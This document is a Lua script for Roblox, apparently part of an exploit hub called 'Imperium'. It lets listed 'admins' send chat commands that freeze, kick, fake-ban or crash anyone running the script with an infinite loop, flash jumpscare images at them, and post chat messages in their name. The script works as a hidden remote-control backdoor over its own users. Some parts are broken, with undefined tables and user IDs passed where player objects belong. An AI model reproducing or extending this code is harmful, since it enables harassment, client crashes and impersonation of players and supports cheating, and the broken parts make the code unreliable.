local player = game.Players.LocalPlayer

local function GetRoot(player)
    return player.Character and player.Character:FindFirstChild("HumanoidRootPart")
end

local function GetHum(player)
    return player.Character and player.Character:FindFirstChild("Humanoid")
end

local function Arg3(command)
    local x = ""
    for i = 1, #command do
        if i >= 2 then
            x = x .. " " .. command[i]  -- Cambia command[i + 1] por command[i]
        end
    end
    return x
end

local function GenImage(list)
    task.spawn(function()
        local ScreenGui = Instance.new("ScreenGui")
        local Image = Instance.new("ImageLabel")
        ScreenGui.Name = "Temp"
        ScreenGui.IgnoreGuiInset = true
        ScreenGui.Parent = game.CoreGui
        Image.Name = "Image"
        Image.ImageTransparency = 0
        Image.BackgroundTransparency = 1
        Image.Position = UDim2.new(0, 0, 0, 0)
        Image.Size = UDim2.new(1, 0, 1, 0)
        Image.Image = "rbxassetid://" .. list[math.random(1, #list)]
        Image.Parent = ScreenGui
        task.wait(5)
        ScreenGui:Destroy()
    end)
end

local bending = false
local kickmsg = 'PERMA BANNED'

local function commands(msg, plr)
    if DisableMod == false or table.find(ImperiumAdmins, plr) then
        local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
        local Msg = string.lower(msg)
        local SplitCMD = string.split(Msg, ' ')
        local Lower = string.lower(player.Name)

        local Allowed = SplitCMD[2] and string.find(Lower, SplitCMD[2])

        if Allowed then
            if string.find(SplitCMD[1], '!freeze') then
                if GetRoot(player) then
                    player.Character.HumanoidRootPart.Anchored = true
                end
            end

            if string.find(SplitCMD[1], '!thaw') then
                if GetRoot(player) then
                    player.Character.HumanoidRootPart.Anchored = false
                end
            end

            if string.find(SplitCMD[1], '!kick') then
                local ISADMIN = table.find(ImperiumAdmins, player.UserId)
                if not ISADMIN then
                    kickmsg = Mod.Name
                    player:Kick(kickmsg)
                end
            end

            if string.find(SplitCMD[1], '!crash') then
                local ISADMIN = table.find(ImperiumAdmins, player.UserId)
                if not ISADMIN then
                    pcall(function()
                        while true do end
                    end)
                end
            end

            if string.find(SplitCMD[1], '!bring') then
                local targetPlayerName = SplitCMD[2]
                local targetPlayer = game.Players:FindFirstChild(targetPlayerName)
            
                if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    targetPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
                else
                    warn("El jugador no existe o no tiene un personaje.")
                end
            end

            if string.find(SplitCMD[1], '!fakeban') then
                if table.find(ImperiumAdmins, plr) then
                    local ISADMIN = table.find(ImperiumAdmins, player.UserId)
                    if not ISADMIN then
                        player:Kick('You have been banned for exploiting.')
                    end
                end
            end

            if string.find(SplitCMD[1], '!fling') then
                if GetRoot(plr) then
                    GetRoot(plr).CFrame = CFrame.new(9999999999, 9999999999, 9999999999)
                end
            end

            if string.find(SplitCMD[1], '!milk') then
                GenImage(milk)
            end

            if string.find(SplitCMD[1], '!jumpscare') then
                GenImage(jumpscares)
            end

            if string.find(SplitCMD[1], '!say') then
                local Message = Arg3(SplitCMD)
                local args = { [1] = Message, [2] = "All" }
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
            end

            if string.find(SplitCMD[1], '!blind') then
                if game:GetService("Lighting"):FindFirstChild("Blur") then
                    game:GetService("Lighting"):FindFirstChild("Blur"):Destroy()
                end
                local Blur = Instance.new("BlurEffect")
                Blur.Size = 30
                Blur.Enabled = true
                Blur.Parent = game:GetService("Lighting")
            end

            if string.find(SplitCMD[1], '!unblind') then
                if game:GetService("Lighting"):FindFirstChild("Blur") then
                    game:GetService("Lighting"):FindFirstChild("Blur"):Destroy()
                end
            end

            if string.find(SplitCMD[1], '!kill') then
                local humanoid = GetHum(plr)
                if humanoid then
                    humanoid:ChangeState(15)
                end
            end

        else
            if string.find(msg, '/e test') then
                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hey! I'm using Imperium!", 'All')
            end
        end
    end
end


